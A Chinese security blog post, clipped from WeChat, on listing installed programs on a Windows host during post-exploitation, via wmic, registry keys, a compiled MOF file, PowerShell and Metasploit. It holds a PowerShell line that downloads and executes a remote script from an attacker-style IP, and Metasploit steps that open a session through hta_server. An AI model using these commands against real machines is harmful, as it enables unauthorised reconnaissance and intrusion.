> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CAEtoKe6ijO39xMVZPRKkw)<table style="visibility: visible;"><tbody style="visibility: visible;"><tr style="visibility: visible;"><td width="557" valign="top" height="62" style="word-break: break-all; visibility: visible;"><section style="margin-bottom: 15px; visibility: visible;"><strong style="visibility: visible;">声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section style="visibility: visible;">请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

  

**0x01 前言**

这篇文章我们主要讲的是获取主机已安装程序的多种方式，通过获取的软件及版本信息可用于权限提升、搜集密码等。因为有的方式获取不完整或者可能被安全防护软件拦截，所有我测试了多个方法，以备不时之需。

  

**0x02 通过控制面板查看安装程序**

我们先去控制面板看下总共安装了多少程序，开始菜单 -> 控制面板 -> 程序 -> 程序和功能，也可以在命令行下直接输入appwiz.cpl打开程序和功能查看。  

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8lkLIOWBM2aCibj2xFPnXen3s72A15pemU9suAuX8syE38hcueTxGno4eKWPktz1suicuMBhictg8Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 通过WMI获取安装程序列表**

WMI查询Win32_Product这种方式获取的已安装程序列表并不完整，因为这种方只能获取那些通过Windows Installer安装的程序，所以其它方式安装的程序就会无法获取。  

```
`wmic product get name,version``wmic /namespace:\\root\cimv2 path win32_product get name,version``Get-WmiObject -Class win32_product | Select-Object -Property name,version`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8lkLIOWBM2aCibj2xFPnXe9Hokiaic7p7DjUgicd8IUdSyqQLP4P7ffbosU9BuMTe5t83gmz9RKr4OQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

通过这种方式查询已安装程序不仅很慢、而且不完整，还会产生大量应用程序日志，事件ID为：1035，所以并不推荐使用这种方式。

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8lkLIOWBM2aCibj2xFPnXea3XdKoItlQPqhmJZSial7BprsGAHaF8XvicumBvB7ibkwESYbgIZABPOw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 通过注册表获取安装程序列表**

这种方式一般都是通过读取以下4个注册表项中的子健来获取主机上的已安装程序，每个子健代表一个已安装的程序，对应的是控制面板的程序和功能程序列表，Wow6432Node为32位。  

```
`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall``HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall``HKLM\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall``HKCU\\SOFTWARE\\WOW6432NODE\\Microsoft\\Windows\\CurrentVersion\\Uninstall`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8lkLIOWBM2aCibj2xFPnXe0vCWbLFX5ycF5pDorUBUCo1JYxyMbUHku4sQYxH0tmjia6XKiaLVClnw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

#### **(1) mofcomp**

Mofcomp.exe是系统自带的一个工具，用来编译mof文件，并将mof文件中的信息添加到WMI数据库中，可以用WMI Explorer工具来查看WMI支持的各种类。

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8lkLIOWBM2aCibj2xFPnXeias3rOIsRg3XX0z2Uro12HOmyMcBhN7yRL378j8AoTUKvIs78pftsoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

所以我们可以直接通过Mofcomp.exe执行SampleProductsList.mof文件将读取到的注册表项中的子健结果添加进VMI数据库中，然后再用WMIC命令查询即可。

```
`mofcomp.exe C:\ProgramData\SampleProductsList.mof``wmic /namespace:"\\root\default" path sampleproductslist get displayname,displayversion``wmic /namespace:"\\root\default" path sampleproductslist32 get displayname,displayversion`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8lkLIOWBM2aCibj2xFPnXeefmEzYtEyMib1Pz60V6mkrl4BaqbqHb6u9qaRaXgX0pjvyLTOtICK0Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe8lkLIOWBM2aCibj2xFPnXeoTguib9ZvjnkWaqGahxMZ3ZdyJX7jPyMWEB3PS5e5jHfKlJgNCiaJzLA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

SampleProductsList.mof

```
`// "AS-IS" sample MOF file for returning the two uninstall registry subkeys``// Unsupported, provided purely as a sample``// Requires compilation. Example: mofcomp.exe sampleproductslist.mof``// Implements sample classes: "SampleProductList" and "SampleProductlist32"``// (for 64-bit systems with 32-bit software)``#PRAGMA AUTORECOVER``[dynamic, provider("RegProv"),``ProviderClsid("{fe9af5c0-d3b6-11ce-a5b6-00aa00680c3f}"),ClassContext("local|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall")]``class SampleProductsList {``[key] string KeyName;``[read, propertycontext("DisplayName")] string DisplayName;``[read, propertycontext("DisplayVersion")] string DisplayVersion;``};``[dynamic, provider("RegProv"),``ProviderClsid("{fe9af5c0-d3b6-11ce-a5b6-00aa00680c3f}"),ClassContext("local|HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432node\\Microsoft\\Windows\\CurrentVersion\\Uninstall")]``class SampleProductsList32 {``[key] string KeyName;``[read, propertycontext("DisplayName")] string DisplayName;``[read, propertycontext("DisplayVersion")] string DisplayVersion;``};`
```

  

#### **(2) Powershell**

这个Powershell脚本是@3gstudent师傅写的，也是通过读取几个注册表项来获取主机上的已安装程序，加了个判断系统位数，自动判断注册表重定向，但这种方式在执行时肯定会被某数字防护拦截。

```
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.103:8888/ListInstalledPrograms.ps1'); ListPrograms
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

ListInstalledPrograms.ps1

```
`<#``.SYNOPSIS``This script can be used to list the programs that the current Windows system has installed.``Supprot x86 and x64` `Author: 3gstudent@3gstudent``License: BSD 3-Clause``#>``Function ListPrograms``{` `param($RegPath)` `$QueryPath = dir $RegPath -Name``foreach($Name in $QueryPath)``{``(Get-ItemProperty -Path $RegPath$Name).DisplayName``#        (Get-ItemProperty -Path $RegPath$Name).Publisher``#        (Get-ItemProperty -Path $RegPath$Name).DisplayVersion``}``}` `if ([IntPtr]::Size -eq 8)``{``Write-Host "[*] OS: x64"``Write-Host "[*] List the 64 bit programs that have been installed"``$RegPath = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"``ListPrograms -RegPath $RegPath``Write-Host "[+] List the 32 bit programs that have been installed"``$RegPath = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\"``ListPrograms -RegPath $RegPath``}``else``{``Write-Host "[*] OS: x86"``Write-Host "[*] List the 32 bit programs that have been installed"``$RegPath = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"``ListPrograms -RegPath $RegPath``}`
```

  

#### **(3) Metasploit**

首先利用hta_server模块获取一个会话，然后再用enum_applications模块获取主机上已安装的应用程序及其版本列表，虽然也能在会话中用run get_application_list获取，但并不完整。

```
`msf5 exploit(windows/misc/hta_server) > use post/windows/gather/enum_applications``msf5 post(windows/gather/enum_applications) > set session 1``msf5 post(windows/gather/enum_applications) > exploit``meterpreter > run get_application_list`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这是因为get_application_list这个脚本只读取x64的已安装应用程序列表，所以会少一些，而enum_applications这个模块同时读取x64和x32的已安装应用程序列表，所以比较完整。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**参考链接：**

```
`https://3gstudent.github.io/渗透基础-获得当前系统已安装的程序列表``https://docs.microsoft.com/zh-cn/windows/win32/msi/windows-installer-portal``https://docs.microsoft.com/en-us/archive/blogs/askds/how-to-not-use-win32_product-in-group-policy-filtering`
```

  

**0x05 PDF和工具下载**

这篇文章的PDF文档及所使用到的工具可关注【潇湘信安】公众号回复【0627】获取。  

  

* * *

**关 注 有 礼**

  

  

关注公众号回复“9527”可以领取一套HTB靶场文档和视频，“1208”个人常用高效爆破字典，“0221”2020年酒仙桥文章打包，“2191”潇湘信安文章打包，“1212”杀软对比源码+数据源，“0421”Windows提权工具包。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==) 还在等什么？赶紧点击下方名片关注学习吧！![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

 ![](http://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6YLhRjHMxGMsH55CSVdlMC0XEwtoAQI06hia8rd371BcDnQ8bfRmP4YqA/0?wx_fmt=png) ** 潇湘信安 ** 一个不会编程、挖SRC、代码审计的安全爱好者，主要分享一些安全经验、渗透思路、奇淫技巧与知识总结。 142篇原创内容   公众号

 ![](http://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udVsppUXB8icSrqs3DgXGQmtNTUU8UDwxIvyu0V7s0jZy28sf6rLNTHviad1N9qQicqsibACs6YRQwdhw/0?wx_fmt=png) ** Hack分享吧 ** 专注分享优质安全技术文章、学习资料、软件工具和项目等！ 2篇原创内容   公众号

* * *

**推 荐 阅 读**

  

  

  

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247491360&idx=1&sn=e4c3d356b45d7fe821dc2b645f30a595&chksm=cfa6bb33f8d132259884026238db7b79f33da3f3fff2f90a87e4a447118a1be8c4e948031d8f&scene=21#wechat_redirect)

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

* * *

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)